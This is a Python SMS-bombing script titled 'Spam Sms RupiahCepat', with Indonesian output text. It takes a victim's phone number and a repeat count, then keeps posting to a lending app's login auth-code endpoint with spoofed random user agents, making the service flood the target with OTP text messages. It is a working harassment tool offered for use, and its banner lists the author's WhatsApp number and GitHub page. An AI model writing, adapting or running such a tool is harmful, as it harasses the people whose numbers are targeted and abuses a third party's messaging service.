try:
    import requests, json, time, os, sys
    from fake_useragent import UserAgent
except ImportError:exit(f"{hijau}[{merah}x{hijau}] {cyan}Module belum diinstall, install dengan perintah 'pip install requests fake_useragent'")

hijau = '\x1b[1;92m'
cyan = '\x1b[1;96m'
kuning = '\x1b[1;93m'
ungu = '\x1b[1;95m'
putih = '\x1b[1;97m'
biru = '\x1b[1;94m'
merah = '\x1b[1;91m'
gelap = '\x1b[0;37m'

r = requests
ua = UserAgent()
url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
hd = {
"accept": "text/html, application/xhtml+xml, application/json, */*",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"content-length": "166",
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"origin": "https://h5.rupiahcepatweb.com",
"referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-site",
"user-agent": ua.random
}

def tunggu(t):
        while t:
                wd=f'{hijau}[{kuning}#{hijau}] {cyan}Jeda selama '+str(t)+" detik "
                print(wd,end='\r',flush=True)
                time.sleep(1)
                t -= 1

def banner():
    print(f"""{merah}╦═╗┬ ┬┌─┐┬┌─┐┬ ┬╔═╗┌─┐┌─┐┌─┐┌┬┐
{kuning}╠╦╝│ │├─┘│├─┤├─┤║  ├┤ ├─┘├─┤ │ 
{merah}╩╚═└─┘┴  ┴┴ ┴┴ ┴╚═╝└─┘┴  ┴ ┴ ┴ """)

def menu():
   os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
   os.system("echo Nama Tool: Spam Sms RupiahCepat | lolcat -a")
   os.system("echo Author: N4B1Lx75 | lolcat -a")
   os.system("echo Whatsapp: +628811883541 | lolcat -a")
   os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
   os.system("echo Youtube: Nothing | lolcat -a")
   os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")

try:
    banner()
    menu()
except KeyboardInterrupt:exit(f"\n{hijau}[{kuning}-{hijau}] {cyan}Ok, keluar, bye kntl")


try:
    no = sys.argv[1]
    dit = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
    dat = json.dumps(dit)
    jml = int(sys.argv[2])
    for x in range(jml):
         a = r.post(url,headers=hd,data={"data":dat}).text
         b = json.loads(a)["code"]
         if b == 0:
                  print(f"{hijau}[{kuning}+{hijau}] {cyan}Success spam ke "+no)
                  tunggu(60)
         else:
                  print(f"{hijau}[{kuning}x{hijau}] {merah}Gagal spam ke "+no)
                  tunggu(60)
except IndexError:exit("[-] Usage : python spam12.py <nomor> <jumlah spam>")

